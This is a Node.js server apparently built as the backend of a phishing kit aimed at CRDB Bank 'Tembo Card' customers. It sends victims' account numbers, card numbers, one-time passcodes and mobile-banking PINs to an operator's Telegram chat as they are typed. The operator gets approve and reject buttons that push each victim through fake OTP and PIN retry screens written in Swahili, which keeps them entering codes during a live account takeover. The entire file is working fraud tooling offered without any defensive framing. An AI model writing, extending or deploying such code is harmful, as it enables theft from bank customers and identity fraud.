const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Configuration
const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const bot = new TelegramBot(TOKEN, { polling: true });

let adminChatId = null;
let clientData = {};
let pinAttempts = 3;

// Admin start command to get private link
bot.onText(/\/start/, (msg) => {
    adminChatId = msg.chat.id;
    bot.sendMessage(adminChatId, `✅ **Admin Connected Successfully!**\nYour Chat ID is: \`${adminChatId}\`\n\nTelegram notifications will now start strictly from the **Tembo Card Verification** screen onwards.`, { parse_mode: 'Markdown' });
});

// API endpoint to handle user step submissions
app.post('/api/submit', async (req, res) => {
    const { step, data } = req.body;
    clientData = { ...clientData, ...data };

    if (!adminChatId) {
        return res.status(400).json({ success: false, message: 'Admin not connected to bot.' });
    }

    if (step === 'step3') {
        const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
        
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'PROCEED', callback_data: 'card_proceed' },
                        { text: 'DENY INVALID CRDB DETAILS', callback_data: 'card_deny' }
                    ]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(adminChatId, msgText, opts);
        return res.json({ success: true, pendingApproval: true });
    }
    else if (step === 'step4') {
        // Check if the applicant is requesting a new OTP vs submitting an OTP
        if (data.isResend) {
            const msgText = `🔄 **OTP Resend Request**\n\n⚠️ Applicant has requested a new OTP code to be re-sent to their phone.`;
            await bot.sendMessage(adminChatId, msgText, { parse_mode: 'Markdown' });
            return res.json({ success: true, resendAcknowledge: true });
        }

        const msgText = `📱 **Step 4: OTP Verification**\n\n🔢 **Entered OTP:** ${data.otp}\n\n*Choose action for OTP:*`;
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'CORRECT OTP', callback_data: 'otp_correct' },
                        { text: 'INCORRECT OTP', callback_data: 'otp_incorrect' }
                    ]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(adminChatId, msgText, opts);
        return res.json({ success: true, pendingApproval: true });
    }
    else if (step === 'step5') {
        const msgText = `🔒 **Step 5: SimBanking PIN**\n\n🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${pinAttempts}\n\n*Choose action for PIN:*`;
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'CORRECT PIN', callback_data: 'pin_correct' },
                        { text: 'WRONG PIN', callback_data: 'pin_wrong' }
                    ]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(adminChatId, msgText, opts);
        return res.json({ success: true, pendingApproval: true });
    }

    res.json({ success: false, message: 'Invalid step' });
});

let currentClientResponse = null;

bot.on('callback_query', async (query) => {
    const action = query.data;
    const chatId = query.message.chat.id;

    await bot.answerCallbackQuery(query.id);

    if (action === 'card_proceed') {
        await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
        currentClientResponse = { status: 'approved', next: 'otp' };
    } else if (action === 'card_deny') {
        await bot.sendMessage(chatId, '❌ Application stopped due to invalid CRDB details.');
        currentClientResponse = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details).' };
    } else if (action === 'otp_correct') {
        await bot.sendMessage(chatId, '✅ OTP correct. Moving applicant to PIN step.');
        currentClientResponse = { status: 'approved', next: 'pin' };
    } else if (action === 'otp_incorrect') {
        await bot.sendMessage(chatId, '❌ Incorrect OTP. Applicant forced to enter new OTP.');
        currentClientResponse = { status: 'retry_otp', message: 'Namba ya OTP si sahihi. Tafadhali ingiza OTP mpya.' };
    } else if (action === 'pin_correct') {
        await bot.sendMessage(chatId, '✅ PIN correct. Proceeding to success screen.');
        pinAttempts = 3;
        currentClientResponse = { status: 'approved', next: 'success' };
    } else if (action === 'pin_wrong') {
        pinAttempts--;
        if (pinAttempts <= 0) {
            await bot.sendMessage(chatId, '🚫 Account blocked due to 3 wrong PIN attempts.');
            currentClientResponse = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa 3 ya PIN.' };
            pinAttempts = 3;
        } else {
            await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${pinAttempts} attempt remains.`);
            currentClientResponse = { status: 'retry_pin', attemptsLeft: pinAttempts, message: `Incorrect pin, ${pinAttempts} attempt remains` };
        }
    }
});

app.get('/api/poll-status', (req, res) => {
    const checkInterval = setInterval(() => {
        if (currentClientResponse) {
            clearInterval(checkInterval);
            const resp = currentClientResponse;
            currentClientResponse = null;
            res.json(resp);
        }
    }, 1000);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
                    
